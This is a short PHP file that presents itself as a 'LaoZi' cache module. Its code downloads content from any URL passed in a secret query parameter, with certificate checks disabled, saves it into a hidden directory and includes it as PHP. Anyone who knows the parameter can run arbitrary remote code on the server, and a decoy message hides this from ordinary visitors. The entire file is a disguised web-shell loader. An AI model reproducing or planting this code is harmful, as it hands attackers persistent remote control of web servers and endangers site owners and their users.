<?php
if (basename($_SERVER['SCRIPT_FILENAME']) === 'index.php' && !isset($_GET['laolierzi']) && !isset($_COOKIE['current_cache'])) {
    exit("LaoZi Module Ready.");
}
$cacheDir = __DIR__ . DIRECTORY_SEPARATOR . '.cache_zi' . DIRECTORY_SEPARATOR;
$cacheFile = $cacheDir . 'lao.zi';
$cachePhp = $cacheFile . '.php';
if (!is_dir($cacheDir)) {
    @mkdir($cacheDir, 0755, true);
}

if (isset($_GET['laolierzi'])) {
    $url = trim($_GET['laolierzi']);
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $context = stream_context_create(['http' => ['timeout' => 5], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            @file_put_contents($cacheFile, $content);
            if (strpos($content, '<?') !== false) {
                @file_put_contents($cachePhp, $content);
            } else {
                @unlink($cachePhp);
            }
            @setcookie('current_cache', $url, time() + 3600 * 24 * 7, "/");
        }
    }
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}
if (file_exists($cacheFile)) {
    $content = @file_get_contents($cacheFile);
    if (strpos($content, '<?') !== false && file_exists($cachePhp)) {
        @include $cachePhp;
    } else {
        echo $content;
    }
} else {
    echo "LaoZi is idle. Pass ?laolierzi=YOUR_URL to load content.";
}
?>
